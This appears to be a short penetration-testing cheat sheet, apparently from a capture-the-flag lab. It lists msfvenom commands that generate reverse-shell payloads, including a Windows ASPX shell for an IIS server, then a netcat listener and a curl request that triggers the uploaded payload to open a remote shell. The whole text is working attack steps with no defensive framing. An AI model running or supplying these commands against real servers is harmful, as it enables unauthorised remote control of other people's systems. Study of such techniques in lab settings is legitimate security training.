Reverse shell by file type:
```
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <FILETYPE> -o <OUTPUT>.<FILETYPE>
```

IIS:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f aspx -o pwn.aspx
```

Set up netcat listener:
```
nc -nvlp <PORT>
```

Use curl to get reverse shell
```
curl http://10.10.160.36:49663/nt4wrksv/pwn.aspx
```